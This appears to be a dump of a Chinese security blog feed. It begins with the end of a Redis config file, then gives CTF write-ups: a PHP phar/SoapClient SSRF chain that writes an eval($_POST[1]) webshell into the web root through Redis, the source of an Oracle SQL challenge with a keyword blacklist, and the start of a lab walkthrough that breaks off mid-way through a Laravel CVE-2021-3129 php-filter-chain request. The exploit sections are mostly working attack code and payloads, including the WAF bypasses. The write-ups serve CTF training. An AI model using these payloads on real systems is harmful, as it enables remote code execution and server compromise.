DOCKER/NAT support ######################## # In certain deployments, Redis Cluster nodes address discovery fails, because # addresses are NAT-ted or because ports are forwarded (the typical case is # Docker and other containers). # # In order to make Redis Cluster working in such environments, a static # configuration where each node knows its public address is needed. The # following two options are used for this scope, and are: # # * cluster-announce-ip # * cluster-announce-port # * cluster-announce-bus-port # # Each instruct the node about its address, client port, and cluster message # bus port. The information is then published in the header of the bus packets # so that other nodes will be able to correctly map the address of the node # publishing the information. # # If the above options are not used, the normal Redis Cluster auto-detection # will be used instead. # # Note that when remapped, the bus port may not be at the fixed offset of # clients port + 10000, so you can specify any port and bus-port depending # on how they get remapped. If the bus-port is not set, a fixed offset of # 10000 will be used as usually. # # Example: # # cluster-announce-ip 10.1.1.5 # cluster-announce-port 6379 # cluster-announce-bus-port 6380 ################################## SLOW LOG ################################### # The Redis Slow Log is a system to log queries that exceeded a specified # execution time. The execution time does not include the I/O operations # like talking with the client, sending the reply and so forth, # but just the time needed to actually execute the command (this is the only # stage of command execution where the thread is blocked and can not serve # other requests in the meantime). # # You can configure the slow log with two parameters: one tells Redis # what is the execution time, in microseconds, to exceed in order for the # command to get logged, and the other parameter is the length of the # slow log. When a new command is logged the oldest one is removed from the # queue of logged commands. # The following time is expressed in microseconds, so 1000000 is equivalent # to one second. Note that a negative number disables the slow log, while # a value of zero forces the logging of every command. slowlog-log-slower-than 10000 # There is no limit to this length. Just be aware that it will consume memory. # You can reclaim memory used by the slow log with SLOWLOG RESET. slowlog-max-len 128 ################################ LATENCY MONITOR ############################## # The Redis latency monitoring subsystem samples different operations # at runtime in order to collect data related to possible sources of # latency of a Redis instance. # # Via the LATENCY command this information is available to the user that can # print graphs and obtain reports. # # The system only logs operations that were performed in a time equal or # greater than the amount of milliseconds specified via the # latency-monitor-threshold configuration directive. When its value is set # to zero, the latency monitor is turned off. # # By default latency monitoring is disabled since it is mostly not needed # if you don&#x27;t have latency issues, and collecting data has a performance # impact, that while very small, can be measured under big load. Latency # monitoring can easily be enabled at runtime using the command # &quot;CONFIG SET latency-monitor-threshold &quot; if needed. latency-monitor-threshold 0 ############################# EVENT NOTIFICATION ############################## # Redis can notify Pub/Sub clients about events happening in the key space. # This feature is documented at http://redis.io/topics/notifications # # For instance if keyspace events notification is enabled, and a client # performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two # messages will be published via Pub/Sub: # # PUBLISH __keyspace@0__:foo del # PUBLISH __keyevent@0__:del foo # # It is possible to select the events that Redis will notify among a set # of classes. Every class is identified by a single character: # # K Keyspace events, published with __keyspace@__ prefix. # E Keyevent events, published with __keyevent@__ prefix. # g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ... # $ String commands # l List commands # s Set commands # h Hash commands # z Sorted set commands # x Expired events (events generated every time a key expires) # e Evicted events (events generated when a key is evicted for maxmemory) # A Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events. # # The &quot;notify-keyspace-events&quot; takes as argument a string that is composed # of zero or multiple characters. The empty string means that notifications # are disabled. # # Example: to enable list and generic events, from the point of view of the # event name, use: # # notify-keyspace-events Elg # # Example 2: to get the stream of the expired keys subscribing to channel # name __keyevent@0__:expired use: # # notify-keyspace-events Ex # # By default all notifications are disabled because most users don&#x27;t need # this feature and the feature has some overhead. Note that if you don&#x27;t # specify at least one of K or E, no events will be delivered. notify-keyspace-events &quot;&quot; ############################### ADVANCED CONFIG ############################### # Hashes are encoded using a memory efficient data structure when they have a # small number of entries, and the biggest entry does not exceed a given # threshold. These thresholds can be configured using the following directives. hash-max-ziplist-entries 512 hash-max-ziplist-value 64 # Lists are also encoded in a special way to save a lot of space. # The number of entries allowed per internal list node can be specified # as a fixed maximum size or a maximum number of elements. # For a fixed maximum size, use -5 through -1, meaning: # -5: max size: 64 Kb &lt;-- not recommended for normal workloads # -4: max size: 32 Kb &lt;-- not recommended # -3: max size: 16 Kb &lt;-- probably not recommended # -2: max size: 8 Kb &lt;-- good # -1: max size: 4 Kb &lt;-- good # Positive numbers mean store up to _exactly_ that number of elements # per list node. # The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size), # but if your use case is unique, adjust the settings as necessary. list-max-ziplist-size -2 # Lists may also be compressed. # Compress depth is the number of quicklist ziplist nodes from *each* side of # the list to *exclude* from compression. The head and tail of the list # are always uncompressed for fast push/pop operations. Settings are: # 0: disable all list compression # 1: depth 1 means &quot;don&#x27;t start compressing until after 1 node into the list, # going from either the head or tail&quot; # So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail] # [head], [tail] will always be uncompressed; inner nodes will compress. # 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail] # 2 here means: don&#x27;t compress head or head-&gt;next or tail-&gt;prev or tail, # but compress all nodes between them. # 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail] # etc. list-compress-depth 0 # Sets have a special encoding in just one case: when a set is composed # of just strings that happen to be integers in radix 10 in the range # of 64 bit signed integers. # The following configuration setting sets the limit in the size of the # set in order to use this special memory saving encoding. set-max-intset-entries 512 # Similarly to hashes and lists, sorted sets are also specially encoded in # order to save a lot of space. This encoding is only used when the length and # elements of a sorted set are below the following limits: zset-max-ziplist-entries 128 zset-max-ziplist-value 64 # HyperLogLog sparse representation bytes limit. The limit includes the # 16 bytes header. When an HyperLogLog using the sparse representation crosses # this limit, it is converted into the dense representation. # # A value greater than 16000 is totally useless, since at that point the # dense representation is more memory efficient. # # The suggested value is ~ 3000 in order to have the benefits of # the space efficient encoding without slowing down too much PFADD, # which is O(N) with the sparse encoding. The value can be raised to # ~ 10000 when CPU is not a concern, but space is, and the data set is # composed of many HyperLogLogs with cardinality in the 0 - 15000 range. hll-sparse-max-bytes 3000 # Streams macro node max size / items. The stream data structure is a radix # tree of big nodes that encode multiple items inside. Using this configuration # it is possible to configure how big a single node can be in bytes, and the # maximum number of items it may contain before switching to a new node when # appending new stream entries. If any of the following settings are set to # zero, the limit is ignored, so for instance it is possible to set just a # max entires limit by setting max-bytes to 0 and max-entries to the desired # value. stream-node-max-bytes 4096 stream-node-max-entries 100 # Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in # order to help rehashing the main Redis hash table (the one mapping top-level # keys to values). The hash table implementation Redis uses (see dict.c) # performs a lazy rehashing: the more operation you run into a hash table # that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the # server is idle the rehashing is never complete and some more memory is used # by the hash table. # # The default is to use this millisecond 10 times every second in order to # actively rehash the main dictionaries, freeing memory when possible. # # If unsure: # use &quot;activerehashing no&quot; if you have hard latency requirements and it is # not a good thing in your environment that Redis can reply from time to time # to queries with 2 milliseconds delay. # # use &quot;activerehashing yes&quot; if you don&#x27;t have such hard requirements but # want to free memory asap when possible. activerehashing yes # The client output buffer limits can be used to force disconnection of clients # that are not reading data from the server fast enough for some reason (a # common reason is that a Pub/Sub client can&#x27;t consume messages as fast as the # publisher can produce them). # # The limit can be set differently for the three different classes of clients: # # normal -&gt; normal clients including MONITOR clients # replica -&gt; replica clients # pubsub -&gt; clients subscribed to at least one pubsub channel or pattern # # The syntax of every client-output-buffer-limit directive is the following: # # client-output-buffer-limit # # A client is immediately disconnected once the hard limit is reached, or if # the soft limit is reached and remains reached for the specified number of # seconds (continuously). # So for instance if the hard limit is 32 megabytes and the soft limit is # 16 megabytes / 10 seconds, the client will get disconnected immediately # if the size of the output buffers reach 32 megabytes, but will also get # disconnected if the client reaches 16 megabytes and continuously overcomes # the limit for 10 seconds. # # By default normal clients are not limited because they don&#x27;t receive data # without asking (in a push way), but just after a request, so only # asynchronous clients may create a scenario where data is requested faster # than it can read. # # Instead there is a default limit for pubsub and replica clients, since # subscribers and replicas receive data in a push fashion. # # Both the hard or the soft limit can be disabled by setting them to zero. client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 # Client query buffers accumulate new commands. They are limited to a fixed # amount by default in order to avoid that a protocol desynchronization (for # instance due to a bug in the client) will lead to unbound memory usage in # the query buffer. However you can configure it here if you have very special # needs, such us huge multi/exec requests or alike. # # client-query-buffer-limit 1gb # In the Redis protocol, bulk requests, that are, elements representing single # strings, are normally limited ot 512 mb. However you can change this limit # here. # # proto-max-bulk-len 512mb # Redis calls an internal function to perform many background tasks, like # closing connections of clients in timeout, purging expired keys that are # never requested, and so forth. # # Not all tasks are performed with the same frequency, but Redis checks for # tasks to perform according to the specified &quot;hz&quot; value. # # By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when # Redis is idle, but at the same time will make Redis more responsive when # there are many keys expiring at the same time, and timeouts may be # handled with more precision. # # The range is between 1 and 500, however a value over 100 is usually not # a good idea. Most users should use the default of 10 and raise this up to # 100 only in environments where very low latency is required. hz 10 # Normally it is useful to have an HZ value which is proportional to the # number of clients connected. This is useful in order, for instance, to # avoid too many clients are processed for each background task invocation # in order to avoid latency spikes. # # Since the default HZ value by default is conservatively set to 10, Redis # offers, and enables by default, the ability to use an adaptive HZ value # which will temporary raise when there are many connected clients. # # When dynamic HZ is enabled, the actual configured HZ will be used as # as a baseline, but multiples of the configured HZ value will be actually # used as needed once more clients are connected. In this way an idle # instance will use very little CPU time while a busy instance will be # more responsive. dynamic-hz yes # When a child rewrites the AOF file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. aof-rewrite-incremental-fsync yes # When redis saves RDB file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. rdb-save-incremental-fsync yes # Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good # idea to start with the default settings and only change them after investigating # how to improve the performances and how the keys LFU change over time, which # is possible to inspect via the OBJECT FREQ command. # # There are two tunable parameters in the Redis LFU implementation: the # counter logarithm factor and the counter decay time. It is important to # understand what the two parameters mean before changing them. # # The LFU counter is just 8 bits per key, it&#x27;s maximum value is 255, so Redis # uses a probabilistic increment with logarithmic behavior. Given the value # of the old counter, when a key is accessed, the counter is incremented in # this way: # # 1. A random number R between 0 and 1 is extracted. # 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1). # 3. The counter is incremented only if R &lt; P. # # The default lfu-log-factor is 10. This is a table of how the frequency # counter changes with a different number of accesses with different # logarithmic factors: # # +--------+------------+------------+------------+------------+------------+ # | factor | 100 hits | 1000 hits | 100K hits | 1M hits | 10M hits | # +--------+------------+------------+------------+------------+------------+ # | 0 | 104 | 255 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 1 | 18 | 49 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 10 | 10 | 18 | 142 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 100 | 8 | 11 | 49 | 143 | 255 | # +--------+------------+------------+------------+------------+------------+ # # NOTE: The above table was obtained by running the following commands: # # redis-benchmark -n 1000000 incr foo # redis-cli object freq foo # # NOTE 2: The counter initial value is 5 in order to give new objects a chance # to accumulate hits. # # The counter decay time is the time, in minutes, that must elapse in order # for the key counter to be divided by two (or decremented if it has a value # less &lt;= 10). # # The default value for the lfu-decay-time is 1. A Special value of 0 means to # decay the counter every time it happens to be scanned. # # lfu-log-factor 10 # lfu-decay-time 1 ########################### ACTIVE DEFRAGMENTATION ####################### # # WARNING THIS FEATURE IS EXPERIMENTAL. However it was stress tested # even in production and manually tested by multiple engineers for some # time. # # What is active defragmentation? # ------------------------------- # # Active (online) defragmentation allows a Redis server to compact the # spaces left between small allocations and deallocations of data in memory, # thus allowing to reclaim back memory. # # Fragmentation is a natural process that happens with every allocator (but # less so with Jemalloc, fortunately) and certain workloads. Normally a server # restart is needed in order to lower the fragmentation, or at least to flush # away all the data and create it again. However thanks to this feature # implemented by Oran Agra for Redis 4.0 this process can happen at runtime # in an &quot;hot&quot; way, while the server is running. # # Basically when the fragmentation is over a certain level (see the # configuration options below) Redis will start to create new copies of the # values in contiguous memory regions by exploiting certain specific Jemalloc # features (in order to understand if an allocation is causing fragmentation # and to allocate it in a better place), and at the same time, will release the # old copies of the data. This process, repeated incrementally for all the keys # will cause the fragmentation to drop back to normal values. # # Important things to understand: # # 1. This feature is disabled by default, and only works if you compiled Redis # to use the copy of Jemalloc we ship with the source code of Redis. # This is the default with Linux builds. # # 2. You never need to enable this feature if you don&#x27;t have fragmentation # issues. # # 3. Once you experience fragmentation, you can enable this feature when # needed with the command &quot;CONFIG SET activedefrag yes&quot;. # # The configuration parameters are able to fine tune the behavior of the # defragmentation process. If you are not sure about what they mean it is # a good idea to leave the defaults untouched. # Enabled active defragmentation # activedefrag yes # Minimum amount of fragmentation waste to start active defrag # active-defrag-ignore-bytes 100mb # Minimum percentage of fragmentation to start active defrag # active-defrag-threshold-lower 10 # Maximum percentage of fragmentation at which we use maximum effort # active-defrag-threshold-upper 100 # Minimal effort for defrag in CPU percentage # active-defrag-cycle-min 5 # Maximal effort for defrag in CPU percentage # active-defrag-cycle-max 75 # Maximum number of set/hash/zset/list fields that will be processed from # the main dictionary scan # active-defrag-max-scan-fields 1000</span><br></pre></td></tr></table></figure><p>htaccess.txt</p><p><img src="../images/image-20231205195827272.png" alt="image-20231205195827272"></p><p>一共就是这些信息</p><p>分析一下源码  发现没有反序列化入口  然后就猜测是用phar来打  然后题目又给了redis和这个htaccess我们就猜测是不是写webshell 并且不能使用php后缀  </p><p><img src="../images/image-20231205200108706.png" alt="image-20231205200108706"></p><p>因为不知道咋样才能把我们的链子连一起  然后发现了这个check可控  就想到用soap原生链子来打  调用不存在的方法触发call函数来ssrf给内网的redis写马</p><p>所以最终payload  (注意写马的时候并不是未授权登录  在给的redis.conf中  存在这个默认的密码)</p><p><img src="../images/image-20231205200411786.png" alt="image-20231205200411786"></p><p>想完这些后  突然发现存在这个waf </p><p><img src="../images/image-20231205200546624.png" alt="image-20231205200546624"></p><p>第一个就是对文件内容进行检测  检测<code>&lt;?php</code>关键字  但是呢 在phar中  是可以不需要这个前缀的  直接<code>__HALT_COMPILER();?&gt;</code>这样就行了   然后下面的getimagesize就更加简单了  使用<code>GIF89a</code>等等都可以进行绕过</p><p>那么我们的链子就全部构造完成了  借用xz师傅的链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;auth 574c941c5987232d337276764d3413c4\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename test123.wupco\r\nflushall\r\nappend test &#x27;&lt;&#x27;\r\nappend test &#x27;?=eval(\$_POST[1]);?&gt;&#x27;\r\nsave&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="string">&quot;test\r\n&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test_upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;check = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename = <span class="string">&#x27;123.jpg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89A&#x27;</span>.<span class="string">&quot;\n&quot;</span>.<span class="string">&#x27;__HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里注意的是redis写马使用的是append  并不是set</p><p>(原因就是因为我们在写webshell的时候 set用的是整个webshell <code>&lt;?=xx</code>这些  <code>&lt;?=</code>会被正则匹配到  但是append的话就不会  因为我们先写入<code>&lt;</code>   然后再写入<code>?=xxx</code>就能绕过正则了)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall:   清空 Redis 的所有数据，以确保没有冲突或残留数据。</span><br><span class="line"></span><br><span class="line">append test &#x27;&lt;&#x27;: 在 Redis 键名为 test 的字符串值末尾追加字符 &#x27;&lt;&#x27;。</span><br><span class="line"></span><br><span class="line">append test &#x27;?=eval(\$_POST[1]);?&gt;&#x27;:在 Redis 键名为 test 的字符串值末尾追加 PHP 代码 ?=eval(\$_POST[1]);?&gt;，其中 $_POST[1] 表示从 POST 请求中获取的第一个参数。攻击者试图将 PHP 代码插入 Redis 中，以在服务器上执行任意 PHP 代码。</span><br></pre></td></tr></table></figure><p>其实这里的绕过方式还有这种</p><p><img src="../images/image-20231206103945003.png" alt="image-20231206103945003"></p><p>在这个redis 6.X版本中  会<code>&lt;\?</code>会被解析成<code>&lt;?</code>还是能绕过过滤</p><h2 id="ez-oracle"><a href="#ez-oracle" class="headerlink" title="ez_oracle"></a>ez_oracle</h2><p>参考文章 <a href="https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle">https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle</a></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line"></span><br><span class="line">import oracledb</span><br><span class="line">from flask import Flask, request</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = &quot;system&quot;</span><br><span class="line">password = &quot;PaAasSSsSwoRrRDd&quot;</span><br><span class="line">ol_server = &quot;127.0.0.1&quot;</span><br><span class="line">ol_port = 1521</span><br><span class="line">sid = &quot;orcl&quot;</span><br><span class="line">dsn = &quot;&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;.format(ol_server, ol_port, sid)</span><br><span class="line">logging.basicConfig(level=logging.INFO, filename=&#x27;/var/log/web.log&#x27;, format=&#x27;%(asctime)s %(message)s&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(sql):</span><br><span class="line">    blacklist = [&quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;update&quot;, &quot;table&quot;, &quot;user&quot;, &quot;drop&quot;, &quot;alert&quot;, &quot;procedure&quot;, &quot;exec&quot;,</span><br><span class="line">                 &quot;open&quot;, &quot;:=&quot;, &quot;declare&quot;, &quot;runtime&quot;, &quot;process&quot;, &quot;invoke&quot;, &quot;newinstance&quot;, &quot;parse&quot;,</span><br><span class="line">                 &quot;.class&quot;, &quot;loader&quot;, &quot;script&quot;, &quot;url&quot;, &quot;xml&quot;, &quot;method&quot;, &quot;field&quot;, &quot;reflect&quot;, &quot;defineclass&quot;,</span><br><span class="line">                 &quot;getclass&quot;, &quot;forname&quot;, &quot;constructor&quot;, &quot;transform&quot;, &quot;sql&quot;, &quot;beans&quot;, &quot;.net&quot;, &quot;http&quot;, &quot;.rmi&quot;, &quot;naming&quot;</span><br><span class="line">                 ]</span><br><span class="line">    sql = sql.lower()</span><br><span class="line">    for blackword in blacklist:</span><br><span class="line">        if blackword in sql:</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log(ip, sql, error=None):</span><br><span class="line">    error_text = &quot;-----------------------&#123;&#125;-----------------------\n&quot;.format(ip)</span><br><span class="line">    error_text += &quot;sql: &#123;&#125; \n&quot;.format(sql)</span><br><span class="line">    if error != None:</span><br><span class="line">        error_text += &quot;error: &#123;&#125; \n&quot;.format(error)</span><br><span class="line">    error_text += &quot;-------------------------------------------------&quot;</span><br><span class="line">    logging.error(error_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/query&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def query():</span><br><span class="line">    sql = request.form[&quot;sql&quot;]</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if check(sql):</span><br><span class="line">        return &quot;waf&quot;</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            conn = oracledb.connect(user=username, password=password, dsn=dsn)</span><br><span class="line">            conn.callTimeout = 5000</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            cursor.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            log(ip, sql)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            log(ip, sql, e)</span><br><span class="line">            return &quot;error&quot;</span><br><span class="line">        return &quot;query success&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8888)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;solo-php&quot;&gt;&lt;a href=&quot;#solo-php&quot; class=&quot;headerlink&quot; title=&quot;solo-php&quot;&gt;&lt;/a&gt;solo-php&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-c</title>
    <link href="https://ke1nys.github.io/posts/bb2e0be6.html"/>
    <id>https://ke1nys.github.io/posts/bb2e0be6.html</id>
    <published>2023-11-28T11:57:45.000Z</published>
    <updated>2023-12-06T02:51:48.631Z</updated>
    
    <content type="html"><![CDATA[<p>此环境是没有域的  纯是内网</p><p>目标ip 192.168.52.130</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/vulntarget]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.130 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.130  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.130:80 open</span><br><span class="line">192.168.52.130:22 open</span><br></pre></td></tr></table></figure><p>这里的话就开放了两个端口 </p><p>80端口是存在一个laravel的一个<code>CVE 2021-3129</code>  这个直接去网上招poc来打就行  但是这里的话我就直接用N1CTF的一道题的方法来打 就是php-filter-chain</p><p>抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.52.130</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-